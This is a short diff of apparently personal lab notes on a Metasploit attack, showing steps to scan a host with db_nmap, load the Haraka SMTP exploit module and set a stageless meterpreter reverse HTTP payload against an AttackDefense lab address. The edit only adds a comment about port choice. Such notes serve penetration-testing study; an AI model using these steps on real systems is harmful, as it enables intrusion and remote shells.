@@ -94,7 +94,7 @@ When userid is 0 then you are root user
 4) set global variable for `rhosts` (setg)
 5) `db_nmap -sS -sV -O ip`
 6) `use  exploit/linux/smtp/haraka `
-	1) `set srvport 9898` 
+	1) `set srvport 9898`  (we need port 8080 as our lport so we need to change it)
 	2) `set email_to root@attackdefense.test `
 	3) `set payload linux.x64/meterpreter_reverse_http ` (stageless payload)
 	4) `options` 
